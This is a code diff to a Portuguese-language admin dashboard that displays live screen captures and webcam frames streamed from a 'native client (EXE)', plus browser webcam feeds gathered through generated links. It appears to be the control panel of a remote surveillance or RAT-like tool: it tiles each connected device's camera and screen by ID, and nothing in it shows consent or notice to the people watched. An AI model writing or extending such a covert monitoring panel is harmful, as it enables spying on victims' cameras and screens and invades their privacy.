@@ -12,6 +12,11 @@
             grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
             gap: 1rem;
         }
+        .screen-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(500px, 1fr));
+            gap: 1rem;
+        }
         .video-container {
             position: relative;
             background: #000;
@@ -19,7 +24,7 @@
             overflow: hidden;
             aspect-ratio: 16/9;
         }
-        video {
+        video, img {
             width: 100%;
             height: 100%;
             object-fit: cover;
@@ -47,6 +52,14 @@
             </form>
             <div id="newLinkDisplay" class="mt-4 hidden p-3 bg-green-50 border border-green-200 rounded text-green-700 break-all">
                 Link gerado: <a href="#" id="generatedUrl" target="_blank" class="font-mono underline"></a>
+            </div>
+        </section>
+
+        <!-- Live Screen Section -->
+        <section>
+            <h2 class="text-xl font-semibold mb-4 text-gray-800">Telas em Tempo Real (APP)</h2>
+            <div id="screenGrid" class="screen-grid">
+                <!-- Screens will be injected here -->
             </div>
         </section>
 
@@ -91,35 +104,84 @@
     <script>
         const socket = io();
         const videoGrid = document.getElementById('videoGrid');
+        const screenGrid = document.getElementById('screenGrid');
         const peers = {};
+        const nativeFeeds = {}; 
+        const screenFeeds = {};
 
-        // Handle link generation
-        document.getElementById('linkForm').onsubmit = async (e) => {
-            e.preventDefault();
-            const formData = new FormData(e.target);
-            const response = await fetch('/generate_link', {
-                method: 'POST',
-                body: formData
-            });
-            const data = await response.json();
-            const display = document.getElementById('newLinkDisplay');
-            const link = document.getElementById('generatedUrl');
-            link.href = data.url;
-            link.textContent = data.url;
-            display.classList.remove('hidden');
-        };
+        // Escuta frames da CÂMERA do cliente nativo (EXE)
+        socket.on('native_stream', (data) => {
+            let container = document.getElementById(`native-cam-${data.id}`);
+            if (!container) {
+                container = document.createElement('div');
+                container.id = `native-cam-${data.id}`;
+                container.className = 'video-container';
+                container.innerHTML = `
+                    <div class="absolute top-2 left-2 bg-red-600 text-white text-xs px-2 py-1 rounded z-10">AO VIVO (CAM)</div>
+                    <img id="img-cam-${data.id}" src="">
+                    <div class="absolute bottom-2 left-2 text-white text-xs bg-black/50 px-2 py-1 rounded">ID: ${data.id.substring(0, 8)}</div>
+                `;
+                videoGrid.appendChild(container);
+                nativeFeeds[data.id] = container;
+            }
+            const img = document.getElementById(`img-cam-${data.id}`);
+            if (img) img.src = data.frame;
 
-        // WebRTC Signaling Logic for Dashboard
+            clearTimeout(container.timeout);
+            container.timeout = setTimeout(() => {
+                container.remove();
+                delete nativeFeeds[data.id];
+            }, 5000);
+        });
+
+        // Escuta frames da TELA do cliente nativo (EXE)
+        socket.on('native_screen_stream', (data) => {
+            let container = document.getElementById(`native-screen-${data.id}`);
+            if (!container) {
+                container = document.createElement('div');
+                container.id = `native-screen-${data.id}`;
+                container.className = 'video-container';
+                container.innerHTML = `
+                    <div class="absolute top-2 left-2 bg-blue-600 text-white text-xs px-2 py-1 rounded z-10">AO VIVO (TELA)</div>
+                    <img id="img-screen-${data.id}" src="">
+                    <div class="absolute bottom-2 left-2 text-white text-xs bg-black/50 px-2 py-1 rounded">ID: ${data.id.substring(0, 8)}</div>
+                `;
+                screenGrid.appendChild(container);
+                screenFeeds[data.id] = container;
+            }
+            const img = document.getElementById(`img-screen-${data.id}`);
+            if (img) img.src = data.frame;
+
+            clearTimeout(container.timeout);
+            container.timeout = setTimeout(() => {
+                container.remove();
+                delete screenFeeds[data.id];
+            }, 5000);
+        });
+
+        // Join as admin
         socket.on('connect', () => {
             socket.emit('join', { room: 'admin' });
         });
 
+        // WebRTC Signaling (para câmera via navegador)
         socket.on('signal', async (data) => {
             const { from, signal } = data;
-            
             if (!peers[from]) {
-                createVideoElement(from);
-                initPeerConnection(from);
+                const container = document.createElement('div');
+                container.id = `container-${from}`;
+                container.className = 'video-container';
+                container.innerHTML = `
+                    <div class="absolute top-2 left-2 bg-green-600 text-white text-xs px-2 py-1 rounded z-10">AO VIVO (WEB)</div>
+                    <video id="video-${from}" autoplay playsinline></video>
+                    <div class="absolute bottom-2 left-2 text-white text-xs bg-black/50 px-2 py-1 rounded">ID: ${from.substring(0, 8)}</div>
+                `;
+                videoGrid.appendChild(container);
+                
+                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                pc.onicecandidate = (e) => { if (e.candidate) socket.emit('signal', { room: from, signal: { ice: e.candidate }, from: 'admin' }); };
+                pc.ontrack = (e) => { document.getElementById(`video-${from}`).srcObject = e.streams[0]; };
+                peers[from] = { pc };
             }
 
             const pc = peers[from].pc;
@@ -137,93 +199,22 @@
 
         socket.on('client_disconnected', (data) => {
             const container = document.getElementById(`container-${data.id}`);
-            const label = document.getElementById(`label-${data.id}`);
-            const video = document.getElementById(`video-${data.id}`);
-            
-            if (container) {
-                // Em vez de remover, vamos marcar como offline e manter o frame
-                container.style.opacity = "0.7";
-                if (video) video.style.filter = "grayscale(100%)";
-                if (label) {
-                    label.classList.replace('bg-black/50', 'bg-red-600/80');
-                    label.textContent = "OFFLINE - " + label.textContent;
-                }
-            }
-            
-            if (peers[data.id]) {
-                peers[data.id].pc.close();
-                delete peers[data.id];
-            }
+            if (container) container.remove();
+            if (peers[data.id]) { peers[data.id].pc.close(); delete peers[data.id]; }
         });
 
-        // Handle Native Client Frames
-        socket.on('native_frame_update', (data) => {
-            const { id, frame } = data;
-            let video = document.getElementById(`video-${id}`);
-            
-            if (!video) {
-                createVideoElement(id, true);
-                video = document.getElementById(`video-${id}`);
-            }
-            
-            // For native client, we use an <img> or update video src differently
-            // but to keep consistency, let's use the createVideoElement logic
-            if (video.tagName === 'VIDEO') {
-                // Se era um video, vamos trocar por um img no container
-                const container = document.getElementById(`container-${id}`);
-                const img = document.createElement('img');
-                img.id = `video-${id}`;
-                img.src = frame;
-                img.className = 'w-full h-full object-cover';
-                container.replaceChild(img, video);
-            } else {
-                video.src = frame;
-            }
-        });
-
-        function createVideoElement(id, isNative = false) {
-            const container = document.createElement('div');
-            container.className = 'video-container';
-            container.id = `container-${id}`;
-            
-            let displayElement;
-            if (isNative) {
-                displayElement = document.createElement('img');
-            } else {
-                displayElement = document.createElement('video');
-                displayElement.autoplay = true;
-                displayElement.playsinline = true;
-            }
-            displayElement.id = `video-${id}`;
-            
-            const label = document.createElement('div');
-            label.id = `label-${id}`;
-            label.className = 'absolute bottom-0 left-0 right-0 bg-black/50 text-white p-2 text-xs';
-            label.textContent = `${isNative ? '[Nativo]' : '[Web]'} Dispositivo: ${id.substring(0,8)}`;
-            
-            container.appendChild(displayElement);
-            container.appendChild(label);
-            videoGrid.appendChild(container);
-        }
-
-        function initPeerConnection(id) {
-            const pc = new RTCPeerConnection({
-                iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
-            });
-
-            pc.onicecandidate = (event) => {
-                if (event.candidate) {
-                    socket.emit('signal', { room: id, signal: { ice: event.candidate }, from: 'admin' });
-                }
-            };
-
-            pc.ontrack = (event) => {
-                const video = document.getElementById(`video-${id}`);
-                if (video) video.srcObject = event.streams[0];
-            };
-
-            peers[id] = { pc };
-        }
+        // Gerar Link
+        document.getElementById('linkForm').onsubmit = async (e) => {
+            e.preventDefault();
+            const formData = new FormData(e.target);
+            const response = await fetch('/generate_link', { method: 'POST', body: formData });
+            const data = await response.json();
+            const display = document.getElementById('newLinkDisplay');
+            const link = document.getElementById('generatedUrl');
+            link.href = data.url;
+            link.textContent = data.url;
+            display.classList.remove('hidden');
+        };
     </script>
 </body>
 </html>
